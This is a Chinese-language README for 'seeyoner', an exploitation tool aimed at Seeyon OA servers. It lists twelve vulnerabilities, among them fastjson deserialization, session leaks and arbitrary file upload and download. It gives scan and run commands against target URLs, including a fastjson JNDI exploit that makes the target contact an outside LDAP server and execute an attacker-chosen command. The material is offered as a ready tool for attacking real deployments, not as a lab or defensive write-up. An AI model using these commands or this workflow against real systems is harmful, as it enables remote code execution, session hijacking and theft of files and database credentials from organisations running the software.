# seeyoner
致远OA漏洞利用工具
## Usage
```
D:\>seeyoner.exe -help
        seeyoner_v0.1 by xwuyi
Usage：seeyoner.exe -u http://192.168.1.1:8080/ -vn all -m scan
Options:
  -a string
        run mode jndi args
  -c string
        run mode command args
  -h    print this help info.
  -m string
        mode：scan or run
  -show
        show vuln list.
  -u string
        target url.
  -vn string
        vuln number，[1,2,...] (default "all")
```
### Scan
全漏洞探测模式：
```
seeyoner.exe -u http://xxx.com -vn all -m scan
```
![image](https://user-images.githubusercontent.com/45651912/124289994-7f6e4b00-db85-11eb-97d8-3719d5cf552e.png)  
指定漏洞探测模式：
```
seeyoner.exe -u http://xxx.com -vn 1 -m scan
```
![image](https://user-images.githubusercontent.com/45651912/124293777-957e0a80-db89-11eb-95b9-111b0000ac0b.png)  

`-vn`指定漏洞编号，可通过`-show`参数查看
```
D:\>seeyoner.exe -show

漏洞列表：
1、seeyon<8.0_fastjson反序列化
2、thirdpartyController.do管理员session泄露
3、webmail.do任意文件下载（CNVD-2020-62422）
4、ajax.do未授权&任意文件上传
5、getSessionList泄露Session
6、htmlofficeservlet任意文件上传
7、initDataAssess.jsp信息泄露
8、DownExcelBeanServlet信息泄露
9、createMysql.jsp数据库信息泄露
10、test.jsp路径
11、setextno.jsp路径
12、status.jsp路径（状态监控页面）
```
### Run
指定漏洞利用：
```
seeyoner.exe -u http://xxxx.com -vn 2 -m run
```
![image](https://user-images.githubusercontent.com/45651912/124290794-70d46380-db86-11eb-86fa-adceadf58c53.png)  
fastjson反序列化利用：  
`-a`指定LDAP服务地址，`-c`指定命令
```
seeyoner.exe -u http://xxxx.com -vn 1 -m run -a ldap://x.x.x.x:1389/TomcatBypass/TomcatEcho -c whoami
```
![image](https://user-images.githubusercontent.com/45651912/124293426-3ae4ae80-db89-11eb-8a68-def2ba248f8d.png)
  
